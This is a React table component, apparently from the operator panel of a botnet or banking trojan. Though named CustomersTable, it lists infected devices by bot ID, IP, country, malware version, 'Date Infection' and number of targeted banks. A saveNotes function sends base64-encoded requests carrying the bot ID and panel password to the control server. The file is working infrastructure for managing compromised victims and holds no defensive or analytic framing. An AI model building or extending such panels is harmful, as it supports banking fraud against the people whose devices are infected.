import PropTypes from 'prop-types';
import React, { useState, useEffect, useRef } from "react";
import InformationCircleIcon from '@heroicons/react/24/solid/InformationCircleIcon';
import SettingsContext from '../../settings';
import Popup from './popup';
import { format } from 'date-fns';
import $ from 'jquery';
import {
  Dialog,
  DialogTitle,
  DialogContent,
  DialogContentText,
  DialogActions,
  Avatar,
  Box,
  Card,
  Checkbox,
  SvgIcon,
  Button,
  Stack,
  Table,
  TableBody,
  TableCell,
  TableHead,
  TablePagination,
  TableRow,
  Typography,
  TextField
} from '@mui/material';
import { Scrollbar } from 'src/components/scrollbar';
import { getInitials } from 'src/utils/get-initials';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCircle } from '@fortawesome/free-solid-svg-icons';

  
export const CustomersTable = (props) => {
  const {
    count = 0,
    items = [],
    onDeselectAll,
    onDeselectOne,
    onPageChange = () => {},
    onRowsPerPageChange,
    onSelectAll,
    onSelectOne,
    page = 0,
    rowsPerPage = 0,
    selected = [],
  } = props;

  const [openPopup, setOpenPopup] = useState(false);
  const [selectedId, setSelectedId] = useState(null);
  const selectedSome = (selected.length > 0) && (selected.length < items.length);
  const selectedAll = (items.length > 0) && (selected.length === items.length);

    const openinfodialog = (id, index) => {
      setSelectedId(id);
      setOpenPopup(true);
    }

    const handlePopupClose = () => {
      setSelectedId(null);
      setOpenPopup(false);
    };

    function saveNotes(id, note) {
      let request = $.ajax({
        type: 'POST',
        url: SettingsContext.restApiUrl,
        data: {
            'params': new Buffer(
                '{"' + 
                'request":"editComment",' + 
                '"idbot":"' + id + '",' + 
                '"comment":"' + btoa(note) +
                '","password":"' + SettingsContext.password + ' "}').toString('base64')
        }
    });
    }

    return (
      <Card>
        <Scrollbar>
          <Box sx={{ minWidth: 800 }}>
            <Table>
              <TableHead>
                <TableRow>
                  <TableCell padding="checkbox">
                    <Checkbox
                      checked={selectedAll}
                      indeterminate={selectedSome}
                      onChange={(event) => {
                        if (event.target.checked) {
                          onSelectAll?.();
                        } else {
                          onDeselectAll?.();
                        }
                      }}
                    />
                  </TableCell>
                  <TableCell>
                    ID
                  </TableCell>
                  <TableCell>
                    Version
                  </TableCell>
                  <TableCell>
                    Country
                  </TableCell>
                  <TableCell>
                    Tag
                  </TableCell>
                  <TableCell>
                    Last Connect
                  </TableCell>
                  <TableCell>
                    Bank
                  </TableCell>
                  <TableCell>
                    IP
                  </TableCell>
                  <TableCell>
                    Date Infection
                  </TableCell>
                  <TableCell>
                    Notes
                  </TableCell>
                  <TableCell>
                    Info
                  </TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {items.map((customer) => {
                  const isSelected = selected.includes(customer.id);

                  return (
                    <TableRow
                      hover
                      key={customer.id}
                      selected={isSelected}
                    >
                      <TableCell padding="checkbox">
                        <Checkbox
                          checked={isSelected}
                          onChange={(event) => {
                            if (event.target.checked) {
                              onSelectOne?.(customer.id);
                            } else {
                              onDeselectOne?.(customer.id);
                            }
                          }}
                        />
                      </TableCell>
                      <TableCell>
                        <Stack
                          alignItems="center"
                          direction="row"
                          spacing={2}
                        >
                          <Typography variant="subtitle2">
                          {customer.online ? <FontAwesomeIcon icon={faCircle} color={"green"}/> : <FontAwesomeIcon icon={faCircle} color={"red"}/>} {customer.id}
                          </Typography>
                        </Stack>
                      </TableCell>
                      <TableCell>
                        {customer.version}
                      </TableCell>
                      <TableCell>
                      <td><img src={`/assets/flag/${customer.country}.png`}/></td>
                      </TableCell>
                      <TableCell>
                        {customer.tag}
                      </TableCell>
                      <TableCell>
                        {customer.lastConnect}
                      </TableCell>
                      <TableCell>
                        <td>{customer.banks.split(":").length - 1}</td>
                      </TableCell>
                      <TableCell>
                        {customer.ip}
                      </TableCell>
                      <TableCell>
                        {customer.dateInfection}
                      </TableCell>
                      <TableCell>
                        <TextField hiddenLabel defaultValue={customer.comment} id="filled-basic" variant="filled" onChange={(event) => {saveNotes(customer.id, event.target.value);}}/>
                      </TableCell>
                      <TableCell>
                      <div>
                      <Button onClick={() => openinfodialog(customer.id)}
                      startIcon={(
                        <SvgIcon fontSize="small">
                          <InformationCircleIcon />
                        </SvgIcon>
                      )}
                      variant="contained"
                      >
                      Info
                      </Button>
                      <Popup
                      title={customer.id}
                      openPopup={selectedId === customer.id && openPopup}
                      customer={customer}
                      setOpenPopup={setOpenPopup}
                      onClose={handlePopupClose}
                      >
                      
                     
                        
                      </Popup>
                  </div>
                      </TableCell>
                    </TableRow>
                  );
                })}
              </TableBody>
            </Table>
          </Box>
        </Scrollbar>
        <TablePagination
          component="div"
          count={count}
          onPageChange={onPageChange}
          onRowsPerPageChange={onRowsPerPageChange}
          page={page}
          rowsPerPage={rowsPerPage}
          rowsPerPageOptions={[5, 10, 25]}
        />
      </Card>
    );
  }


CustomersTable.propTypes = {
  count: PropTypes.number,
  items: PropTypes.array,
  onDeselectAll: PropTypes.func,
  onDeselectOne: PropTypes.func,
  onPageChange: PropTypes.func,
  onRowsPerPageChange: PropTypes.func,
  onSelectAll: PropTypes.func,
  onSelectOne: PropTypes.func,
  page: PropTypes.number,
  rowsPerPage: PropTypes.number,
  selected: PropTypes.array
};